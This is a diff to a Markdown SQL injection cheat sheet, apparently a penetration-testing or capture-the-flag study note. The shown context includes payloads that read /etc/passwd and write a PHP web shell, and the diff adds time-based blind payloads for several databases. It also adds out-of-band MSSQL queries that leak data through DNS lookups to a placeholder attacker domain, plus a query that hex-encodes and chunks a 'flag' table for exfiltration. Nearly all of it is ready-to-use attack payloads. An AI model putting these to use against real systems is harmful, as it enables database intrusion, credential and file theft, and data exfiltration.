@@ -69,7 +69,10 @@
 | `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                                                   | Read local file                                      |
 | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`                                                               | Write a string to a local file                       |
 | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`                                  | Write a web shell into the base web directory        |
-SLEEP TEST
+
+
+
+**SLEEP TEST**
 
 | Database      | Payload                                                   |
 | ------------- | --------------------------------------------------------- |
@@ -77,3 +80,20 @@ SLEEP TEST
 | MySQL/MariaDB | AND (SELECT SLEEP(10) FROM dual WHERE database() LIKE '%' |
 | PostgreSQL    | \| (SELECT 1 FROM PG_SLEEP(10))                           |
 | Oracle        | AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)          |
+
+**OOB SQLI**
+
+YOUR.DOMAIN = your collab
+SELECT 1234 = 1234 is whatever you are targeting
+
+| SQL Function            | SQL Query                                                                                                                    |
+| ----------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
+| `master..xp_dirtree`    | `DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\\x"');`                     |
+| `master..xp_fileexist`  | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\\x"');`                   |
+| `master..xp_subdirs`    | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\\x"');`                     |
+| `sys.dm_os_file_exists` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');`            |
+| `fn_trace_gettable`     | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);`    |
+| `fn_get_audit_file`     | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);` |
+```sql
+DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) from flag; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63);
+```
